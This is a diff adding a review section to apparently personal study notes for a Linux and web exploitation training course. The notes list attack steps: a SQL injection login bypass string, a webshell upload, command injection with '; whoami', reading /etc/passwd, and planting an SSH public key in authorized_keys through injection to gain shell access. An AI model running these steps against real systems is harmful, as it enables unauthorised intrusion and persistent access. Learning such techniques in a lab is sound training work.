@@ -1044,7 +1044,38 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.h
         9999, 3389 etc.
         Because 9999 is open, we can use our overflow script that we created previously.
         because we've used this before, we'll have to change the IP / port that we're sending it to. It'll be through our loopback on whatever tunnel we connected to 9999.
+
+## Review
+
+    **authentication bypass**
+        if you see login fields, attempt to bypass. bob' OR 1='1 -> login -> inspect -> network, reload page and click on the post, get the raw request -> add a ? to the end of php, then paste that raw request behind it.
+
+    **malicious file upload**
+        check robots.txt (don't forget http enum scan -> nmap -Pn -sT --script=http-enum.nse *targ ip*) this scan will show you robots.txt or uploads or something. that script shows WEB DIRECTORIES.
+        - we found the uploads folder. You need a place to upload, you need the file to upload(webshell.php in downloads), and need a vulnerable server to accept it, and a way to find it. (uploads web directory)
+        - go to the uploads folder, then click on your executable, then you've got a shell.
+
+    **command injection** (input field that lets you enter something "system to ping" ex.
+        - ex: input field wanted us to ping an ip, so we do "127.0.0.1 ; whoami" or you can just start with a semi colon, then run your command after it. ex: ; whoami
+        - if you come across multiple on the same page, test all of them.
+
+    **SSH key upload**
+        - cd .ssh , then ls 
+        - file id_rsa | id_rsa.pub to verify what they are.
+        - pubic key is the one that gets uploaded.
+        - cat id_rsa.pub (copy all of it)
+        - go back to your input field -> ; whoami (www-data) 
+        - cat /etc/passwd to find the users home directory.
+        - go back to the input field. -> ; ls -lisa /var/www -> mkdir /var/www/.ssh -> run ls command again.
+        - then ; echo "" > /var/www/.ssh/authorized_keys (put your public key between the quotes).
+        - then ; cat /var/www/.ssh/authorized_keys (to make sure it uploaded)
+        - then ssh into the box. ssh -i id_rsa www-data@10.50.32.44
+
+    
         
+    
+        
+    
         
     
     
